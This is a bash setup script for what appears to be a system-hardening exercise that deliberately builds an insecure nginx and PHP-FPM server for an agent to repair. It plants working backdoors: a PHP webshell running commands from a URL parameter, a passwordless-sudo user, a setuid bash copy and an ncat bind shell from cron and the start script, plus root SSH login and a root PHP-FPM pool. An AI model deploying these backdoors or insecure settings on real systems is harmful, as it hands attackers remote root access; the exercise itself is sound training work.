#!/usr/bin/env bash
# Hivestorm scenario-16 — nginx + PHP-FPM misconfigurations.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

apt-get update -qq
apt-get install -y --no-install-recommends \
    nginx php8.2-fpm php8.2-cli \
    openssh-server openssh-client sshpass pamtester \
    sudo procps iproute2 cron curl jq ncat \
    ca-certificates >/dev/null

ADMIN=$(jq -r .admin_user            "$ROLES")
ADMINPW=$(jq -r .admin_weak_password "$ROLES")
BACKDOOR=$(jq -r .backdoor_user      "$ROLES")
WEBSHELL=$(jq -r .webshell_path      "$ROLES")
PRIVATE_VHOST=$(jq -r .private_vhost_name "$ROLES")
TROJAN=$(jq -r .trojan_path          "$ROLES")
CRON_PATH=$(jq -r .cron_path         "$ROLES")
LISTENER_PORT=$(jq -r .listener_port "$ROLES")

# ---- users -------------------------------------------------------------------
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMINPW}" | chpasswd
usermod -aG sudo "$ADMIN"

useradd -m -s /bin/bash "$BACKDOOR"
echo "${BACKDOOR}:${BACKDOOR}-pass" | chpasswd
cat >"/etc/sudoers.d/90-${BACKDOOR}" <<EOF
${BACKDOOR} ALL=(ALL) NOPASSWD: ALL
EOF
chmod 0440 "/etc/sudoers.d/90-${BACKDOOR}"

# ---- sshd (weak) -------------------------------------------------------------
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
ssh-keygen -A

# ---- php.ini: cgi.fix_pathinfo=1 + display_errors=On + open_basedir off -----
PHP_INI=/etc/php/8.2/fpm/php.ini
sed -i 's|^;\?cgi.fix_pathinfo\s*=.*|cgi.fix_pathinfo=1|' "$PHP_INI"
sed -i 's|^;\?display_errors\s*=.*|display_errors=On|'   "$PHP_INI"
sed -i 's|^;\?expose_php\s*=.*|expose_php=On|'           "$PHP_INI"
sed -i 's|^;\?allow_url_include\s*=.*|allow_url_include=On|' "$PHP_INI"

# ---- PHP-FPM pool: run as root + clear_env=no -------------------------------
POOL=/etc/php/8.2/fpm/pool.d/www.conf
sed -i 's|^user\s*=.*|user = root|'  "$POOL"
sed -i 's|^group\s*=.*|group = root|' "$POOL"
sed -i 's|^;\?clear_env\s*=.*|clear_env = no|' "$POOL"
# Socket world-writable.
sed -i 's|^;\?listen\.owner\s*=.*|listen.owner = root|' "$POOL"
sed -i 's|^;\?listen\.group\s*=.*|listen.group = root|' "$POOL"
sed -i 's|^;\?listen\.mode\s*=.*|listen.mode = 0666|'   "$POOL"
# Relax security.limit_extensions so the classic cgi.fix_pathinfo RCE actually
# fires on non-.php files (the canonical vulnerable configuration).
if grep -qE '^;?\s*security\.limit_extensions' "$POOL"; then
    sed -i 's|^;\?\s*security\.limit_extensions\s*=.*|security.limit_extensions =|' "$POOL"
else
    printf '\nsecurity.limit_extensions =\n' >>"$POOL"
fi

# ---- nginx: public vhost with fastcgi path-info RCE + catch-all ------------
mkdir -p /var/www/html /var/www/uploads /var/www/private
echo '<?php phpinfo(); ?>' >/var/www/html/info.php
echo '<html><body>ok</body></html>' >/var/www/html/index.html
echo 'secret-internal' >/var/www/private/notes.txt

cat >/etc/nginx/sites-available/default <<'EOF'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    server_tokens on;
    autoindex on;
    root /var/www/html;
    index index.html index.php;

    # Upload area mounted with PHP exec — intentional misconfig.
    location /uploads/ {
        alias /var/www/uploads/;
        autoindex on;
    }

    # Classic PHP-FPM path-info misconfig (no try_files guard).
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
EOF

# Catch-all serving the private vhost — agent should isolate or remove.
cat >"/etc/nginx/sites-available/${PRIVATE_VHOST}" <<EOF
server {
    listen 80;
    server_name ${PRIVATE_VHOST};
    root /var/www/private;
    autoindex on;
    location / { try_files \$uri \$uri/ =404; }
}
EOF
ln -sf "/etc/nginx/sites-available/${PRIVATE_VHOST}" \
       "/etc/nginx/sites-enabled/${PRIVATE_VHOST}"

# ---- webshell dropped under uploads ----------------------------------------
mkdir -p "$(dirname "$WEBSHELL")"
cat >"$WEBSHELL" <<'EOF'
<?php if (isset($_GET['c'])) { system($_GET['c']); } ?>
EOF
chmod 0644 "$WEBSHELL"

# ---- trojan binary + listener cron -----------------------------------------
mkdir -p "$(dirname "$TROJAN")"
cp /bin/bash "$TROJAN"
chmod u+s "$TROJAN"

cat >"$CRON_PATH" <<EOF
* * * * * root /bin/ncat -lk -p ${LISTENER_PORT} -e /bin/bash >/dev/null 2>&1 || true
EOF
chmod 0644 "$CRON_PATH"

# ---- supervisor -------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<EOF
#!/usr/bin/env bash
set +e
mkdir -p /run/sshd /run/php
/usr/sbin/sshd -D &
/usr/sbin/php-fpm8.2 -F -R &
nginx -g 'daemon off;' &
/usr/sbin/cron -f &
# Backdoor listener — start now so the probe is deterministic at baseline
# (cron delivery would otherwise take up to 60s).
( while true; do
    /usr/bin/ncat -lk -p ${LISTENER_PORT} -e /bin/bash >/dev/null 2>&1
    sleep 5
  done ) &
wait
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

apt-get clean
rm -rf /var/lib/apt/lists/*
